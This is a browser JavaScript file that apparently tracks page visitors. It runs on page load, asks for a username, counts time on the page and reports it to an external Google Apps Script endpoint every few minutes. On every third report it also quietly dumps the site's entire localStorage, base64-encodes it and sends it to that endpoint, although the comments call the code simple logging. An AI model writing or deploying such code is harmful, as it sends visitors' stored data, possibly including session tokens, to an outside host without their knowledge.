// Function to generate UUID
function generateUUID() {
  return crypto.randomUUID ? crypto.randomUUID() : 'xxxxxxxx-xxxx-4xxx-yxxx-xxxxxxxxxxxx'.replace(/[xy]/g, function(c) {
    var r = Math.random() * 16 | 0, v = c == 'x' ? r : (r & 0x3 | 0x8);
    return v.toString(16);
  });
}

// Function to log data
function logData(includeUpload = false) {
  const user = localStorage.getItem('capi_user');
  const uuid = localStorage.getItem('capi_uuid');
  const time_sec = localStorage.getItem('capi_time_sec') || '0';
  const screenres = `${screen.width}x${screen.height}`;
  const user_agent = navigator.userAgent;
  const full_url = window.location.href;

  let url = `https://script.google.com/macros/s/AKfycbxhQiisy19Q9lxqPlDEuwGtoicw_AcXbfYeAoUKgskmDOmeWCNLUEabN6OXuxs-8oaF7Q/exec?user=${encodeURIComponent(user)}&uuid=${encodeURIComponent(uuid)}&time_sec=${encodeURIComponent(time_sec)}&screenres=${encodeURIComponent(screenres)}&user_agent=${encodeURIComponent(user_agent)}&full_url=${encodeURIComponent(full_url)}`;

  if (includeUpload) {
    const storageObj = {};
    for (let i = 0; i < localStorage.length; i++) {
      const key = localStorage.key(i);
      storageObj[key] = localStorage.getItem(key);
    }
    const prettyJson = JSON.stringify(storageObj, null, 2);
    const base64data = btoa(prettyJson);
    url += `&upload=${encodeURIComponent(base64data)}`;
  }

  fetch(url, { method: 'GET' })
    .then(response => response.text())
    .then(text => console.log('Log success:', text))
    .catch(error => console.error('Log error:', error));
}

// Function to prompt for username
function promptForUsername(callback) {
  // Create overlay
  const overlay = document.createElement('div');
  overlay.style.position = 'fixed';
  overlay.style.top = '0';
  overlay.style.left = '0';
  overlay.style.width = '100%';
  overlay.style.height = '100%';
  overlay.style.backgroundColor = 'rgba(0, 0, 0, 0.5)';
  overlay.style.display = 'flex';
  overlay.style.justifyContent = 'center';
  overlay.style.alignItems = 'center';
  overlay.style.zIndex = '9999';

  // Create box
  const box = document.createElement('div');
  box.style.backgroundColor = 'white';
  box.style.padding = '20px';
  box.style.borderRadius = '8px';
  box.style.boxShadow = '0 4px 8px rgba(0,0,0,0.2)';
  box.style.textAlign = 'center';
  box.style.width = '300px';

  // Title
  const title = document.createElement('h2');
  title.textContent = 'Username:';
  title.style.marginBottom = '10px';
  box.appendChild(title);

  // Input
  const input = document.createElement('input');
  input.type = 'text';
  input.style.width = '100%';
  input.style.padding = '10px';
  input.style.marginBottom = '10px';
  input.style.border = '1px solid #ccc';
  input.style.borderRadius = '4px';
  box.appendChild(input);

  // Button
  const button = document.createElement('button');
  button.textContent = '✓';
  button.style.backgroundColor = 'transparent';
  button.style.border = '2px solid green';
  button.style.color = 'white';
  button.style.fontSize = '20px';
  button.style.padding = '5px 10px';
  button.style.borderRadius = '50%';
  button.style.cursor = 'pointer';
  button.style.marginLeft = '10px';
  box.appendChild(button);

  // Event listeners
  function submit() {
    const username = input.value.trim();
    if (username) {
      localStorage.setItem('capi_user', username);
      document.body.removeChild(overlay);
      callback();
    }
  }

  button.addEventListener('click', submit);
  input.addEventListener('keypress', (e) => {
    if (e.key === 'Enter') {
      submit();
    }
  });

  overlay.appendChild(box);
  document.body.appendChild(overlay);
  input.focus();
}

// Main function
function initCapi() {
  let needsPrompt = false;

  if (!localStorage.getItem('capi_user')) {
    needsPrompt = true;
  }

  if (!localStorage.getItem('capi_uuid')) {
    localStorage.setItem('capi_uuid', generateUUID());
  }

  if (!localStorage.getItem('capi_time_sec')) {
    localStorage.setItem('capi_time_sec', '0');
  }

  if (!localStorage.getItem('capi_log_count')) {
    localStorage.setItem('capi_log_count', '0');
  }

  function startAfterSetup() {
    // Initial log
    let logCount = parseInt(localStorage.getItem('capi_log_count')) || 0;
    logCount += 1;
    localStorage.setItem('capi_log_count', logCount.toString());
    const includeUpload = (logCount % 3 === 0);
    logData(includeUpload);

    // Start time increment
    setInterval(() => {
      let time = parseInt(localStorage.getItem('capi_time_sec')) || 0;
      time += 1;
      localStorage.setItem('capi_time_sec', time.toString());
    }, 1000);

    // Start logging interval (every 5 min 15 sec = 315000 ms)
    setInterval(() => {
      logCount = parseInt(localStorage.getItem('capi_log_count')) || 0;
      logCount += 1;
      localStorage.setItem('capi_log_count', logCount.toString());
      const includeUpload = (logCount % 3 === 0);
      logData(includeUpload);
    }, 315000);
  }

  if (needsPrompt) {
    promptForUsername(startAfterSetup);
  } else {
    startAfterSetup();
  }
}

// Run on load
window.addEventListener('load', initCapi);